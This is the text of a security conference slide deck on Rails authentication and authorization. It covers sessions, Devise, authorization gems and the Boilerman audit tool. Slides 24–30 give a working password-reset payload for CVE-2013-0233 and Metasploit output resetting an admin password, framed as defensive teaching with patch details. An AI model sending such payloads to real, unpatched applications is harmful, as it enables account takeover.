Going AUTH the Rails on a Crazy Train

Tomek Rabczak Jeff Jarmoc

@sigdroid

@jjarmoc

November, 2015

Who we are
Tomek Rabczak Senior Security Consultant @ NCC Group Ex-Rails Maker turned Rails Breaker

Jeff Jarmoc Lead Product Security Engineer @ Salesforce
Formerly Senior Security Consultant @ NCC Group
Occasional contributor to Metasploit, Brakeman

NCC Group UK Headquarters, Worldwide Offices Software Escrow, Testing, Domain Services

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

2

All Aboard, hahaha!
1. Rails Introduction 2. Authentication 3. Authorization 4. Boilerman: A New Dynamic Analysis Tool

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

3

`rails new sample_app`

sample_app app/ models/ views/ controllers/
... config/
routes.rb ... Gemfile Gemfile.lock

Root directory Application files (Your code) Models (Objects, usually backed by DB) Views (Output presentation templates) Controllers (Ties Models and Views with Actions)
Configuration files directory Maps URLs to Controller Actions
Dependency record of Gem requirements Specific versions of currently installed Gems

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

4

The `Rails Way'

ActiveRecord (Model) SQLi protection via ORM-managed queries (see http://rails-sqli.org/)
ActionView (View) XSS protection via default HTML-output encoding
ActionController (Controller) CSRF protections via protect_from_forgery

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

5

Goin' off the Rails

Authentication (AUTHN) Who is the user? Only HTTP Basic & Digest natively
Authorization (AUTHZ) What can they do? No native facility

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

6

Laying More Track - AUTHN

Option 1 - Roll your own Re-invents the wheel, risks common
mistakes Lots more to AUTHN than checking/
storing passwords has_secure_password in >= 3.1
helps

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

7

Laying More Track - AUTHN
Option 2 - Use a gem Vulnerabilities are far-reaching Ongoing updates/maintenance required Integration can be tricky Core code is generally well vetted Encapsulates past community experience

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

8

Common AUTHN Gems

Devise Most popular, built on Warden

OmniAuth Multi-Provider, OAuth focused

DoorKeeper OAuth2 provider for Rails

AuthLogic Adds a new model blending Sessions w/ Auth

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

9

Arguments for writing

"For one, practical experience shows that authentication on most sites requires extensive customization, and modifying a third-party product is often more work than writing the system from scratch. In addition, off-the-shelf systems can be "black boxes",
with potentially mysterious innards; when you write your own system, you are far more likely to understand it."

https://www.railstutorial.org/book/modeling_users#sec-adding_a_secure_password

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

10

Write our own
Schema: User(name:string, password_digest:string)

http://api.rubyonrails.org/v3.1.0/classes/ActiveModel/SecurePassword/ClassMethods.html

Digests stored with BCrypt
http://chargen.matasano.com/chargen/2015/3/26/enough-with-the-salts-updates-on-secure-password-schemes.html

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

11

Lots more needed.
Storing Creds and Authenticating is just the start
#TODO Session management Complexity requirements Lost/Forgotten Password handling API Tokens / MFA / 2FA / OAUTH

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

12

Session Management

1. Exchange credentials for a token (cookie).
2. Identify user by that token on subsequent requests.
3. Invalidate that token when needed. Logout or Timeout
4. Where we store session state varies

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

13

Encrypted Cookie Sessions

ozzy@ozzy.com *********

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

14

Database Sessions

ozzy@ozzy.com *********

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

15

Database vs. Cookies

Database

Cookie

User Cookie

Random Token

Encrypted Serialized Session Object

Revocation Attack Surface

Maximum Lifetime (Config) One Concurrent Delete From DB
Theft / Enumeration

Maximum Lifetime (Config) Unlimited Concurrent
Theft / Enumeration Cryptographic Attacks Long/Infinite Lived Sessions Encryption Key Exposure *Deserialization Vulns

Per-Request Overhead

DB query (caching may help)

Signature Validation Decryption
Deserialization

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

16

Session Type Config

config/initializers/session_store.rb:

Rails.application.config.session_store :cookie_store,

key: `_session_cookie_name',

or

:expire_after => 2.hours

:active_record_store

Session Expiry Time Must be Manually Configured!

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

17

Cookie Session Config

config/secrets.yml: production: secret_key_base: 'secret key'

Signed, Not Encrypted! production:
secret_token: 'secret key'

config/initializer/session_store.rb: Rails.application.config.action_dispatch.cookies_serializer = :json

RCE w/ Key Exposure! :marshal or :hybrid

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

18

Lost/Forgotten Passwords
Many weak approaches, one strong one.
1) Generate CSPRNG token => User object w/ timestamp 2) Transmit to user out of band (email, SMS, etc) 3) User visits site w/ token 4) User.find_by_token(), verify expiration, change password 5) Delete Token

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

19

app/models/User.rb
Devise User Model

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

20

Routes
app/config/routes.rb: devise_for :users

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

21

Using Devise

Controller Filter before_action :authenticate_user! Often put in ApplicationController Skip where anonymous access needed
Helpers user_signed_in? current_user user_session

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

22

Devise Security History

Unreleased/HEAD Optionally send password change notifications

3.5.1 Remove active tokens on email/password change

3.1.2 Addresses an email enumeration bug

3.1.0 Stores HMAC of tokens, instead of plain-text token

3.0.1 Fixes CSRF Token Fixation
2.2.3 Fixes a type confusion vulnerability

Disclosed by @joernchen of Phenoelit
Feb 5th, 2013
http://www.phenoelit.org/blog/archives/2013/02/05/ mysql_madness_and_rails/

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

23

Devise Password Reset
Pseudo-Code

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

24

MySQL Equality

mysql> select "foo" from dual where 1="1string"; +-----+ | foo | +-----+ | foo | +-----+ 1 row in set, 1 warning (0.00 sec)

mysql> select "foo" from dual where 0="string"; +-----+ | foo | +-----+ | foo | +-----+ 1 row in set, 1 warning (0.00 sec)

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

25

Exploiting in Rails
params[] A hash of (usually) strings containing values of user-supplied parameters
Like this /example?foo=bar&fizz=buzz params => {"foo"=>"bar", "fizz"=>"buzz"}
/example?foo=1&fizz=2 params => {"foo"=>"1", "fizz"=>"2"}

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

26

Exploiting in Rails
Rails Magic XML (<4.0) and JSON (all versions) bodies parsed automatically Typecast per those formats
Like this POST /example HTTP/1.1 content-type: application/xml
<foo>bar</foo> <fizz type="integer">1</fizz>
params => {"foo"=>"bar", "fizz"=>1}

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

27

Devise Password Reset Exploit
How about this? PUT /users/password HTTP/1.1 content-type: application/json
{"user":{ "password":"GAMEOVER", "password_confirmation":"GAMEOVER", "reset_password_token":0} }

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

28

Devise Password Reset Exploit
params[] => {"user"=>{"password"=>"GAMEOVER", "password_confirmation"=>"GAMEOVER", "reset_password_token"=>0}}
Query User.find_by_token(0) SELECT * from Users where token=0 limit 1;
Result Resets password of first User with an outstanding token!

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

29

Metasploit module
rails_devise_pass_reset.rb Clears any outstanding tokens Generates a token for a user of your choosing Resets password to token of your choosing Legitimate user *WILL* get emails
msf auxiliary(rails_devise_pass_reset) > exploit [*] Clearing existing tokens... [*] Generating reset token for admin@example.com... [+] Reset token generated successfully [*] Resetting password to "w00tw00t"... [+] Password reset worked successfully [*] Auxiliary module execution completed

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

30

Password Reset Type Confusion

Patched in Devise
>= v2.2.3, v2.1.3, v2.0.5 and v1.5.4 CVE-2013-0233

Thanks to @joernchen of Phenoelit

Fixed in Rails
= 3.2.12 https://github.com/rails/rails/pull/9208 >= 4.2.0 https://github.com/rails/rails/pull/16069
Reverted in Rails
>= 3.2.13 https://github.com/rails/rails/issues/9292

User.where("token=?", params[token])
Core vulnerability effects more than just Devise!

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

31

Authorization

What can they do? Often tied to the concept of roles Vertical Authorization Site Admin (Full Access) Organization Admin (Full Access to specific Org) "Regular User" (Limited Read Access + Local Write Access) Unauthenticated (No Access) Horizontal Authorization Org1 vs Org2 Data Within an Org, User1 vs User2 Data

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

32

Authorization - Rails
Vertical Authorization
before_actions

Horizontal Authorization
Associations

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

33

Controller Routing

Given a route: get '/posts',
Method path

to: 'posts#index'
controller # action

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

34

Controller Hierarchy

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

35

How they work
3 types of callbacks - :before, :around, :after - Authorization tends to only care about before_actions
Different flavors
- before_action :authorize_user, only: [:action1, :action2, ...] - before_action :authorize_user, except: [:action1, :action2, ...] - before_action :authorize_user, if: method_call - before_action :authorize_user, unless: method_call - skip_before_action :authorize_user, only: [:action1, :action2, ...] - skip_before_action :authorize_user, except: [:action1, :action2, ...] - before_action :authorize_user, Proc.new {|controller| #AUTHZ Logic... }

http://api.rubyonrails.org/classes/ActiveSupport/Callbacks.html

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

36

Authorization Gems
Pundit - Enforced through the use of Policy classes @post = Post.find(params[:id]) authorize @post - https://github.com/elabs/pundit
CanCan(Can) - Enforced through the use of an Ability class - https://github.com/CanCanCommunity/cancancan

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

37

CanCanCan Basics

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

38

Be On The Lookout For...
find_by methods called directly on the model
CAUTION

GOOD

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

39

Be On The Lookout For...
before_action ... only: [:action1, :action2]
CAUTION

GOOD

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

40

Be On The Lookout For...
Lightweight Controllers
CAUTION

GOOD

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

41

Be On The Lookout For...
Authorization Logic in Views
CAUTION

Ensure the application is also verifying permissions in controller action

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

42

Be On The Lookout For...
Skipping of filters

Skips the :authorize_admin filter for every action can be an artifact left over from testing/development

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

43

Rails Scaffolding

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

44

Be On The Lookout For...
Generator/Scaffold artifacts /app/views/bank_accts/show.json.jbuilder:
json.extract @bank_acct, :id, :acct_number, :acct_balance, :acct_holder_name, ...
Possible unwanted attributes added to view or strong_parameters

http://rubyjunky.com/rails-scaffold-dangerous-defaults.html?utm_source=rubyweekly&utm_medium=email

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

45

New Tool: Boilerman

Before Boilerman Audit every Controller manually Track inheritance / overrides Mind the gaps

With Boilerman Dynamically resolve callbacks See all filters for a given Controller#Action Filter the list dynamically In browser or Rails Console

https://github.com/tomekr/boilerman

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

46

New Tool: Boilerman
Dynamic analysis tool Plugs into an existing Rails application
Rails console access needed As a minimum requirement
Mounted as a Rails engine Accessed at /boilerman or through Rails Console

https://github.com/tomekr/boilerman

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

47

Boilerman Demo
Praise be to the almighty demo gods.

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

48

Boilerman
Install: gem install boilerman
Takeaways Rails console can be a very powerful tool
Future Ideas D3 visualizations matrix of Controller#Action & Filter pairs Source querying via pry's source functionality Useful for auditing Pundit based authorization schemes

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

49

Questions?
Tomek Rabczak @sigdroid Jeff Jarmoc @jjarmoc

Tomek Rabczak, Jeff Jarmoc - Going AUTH the Rails on a Crazy Train

50

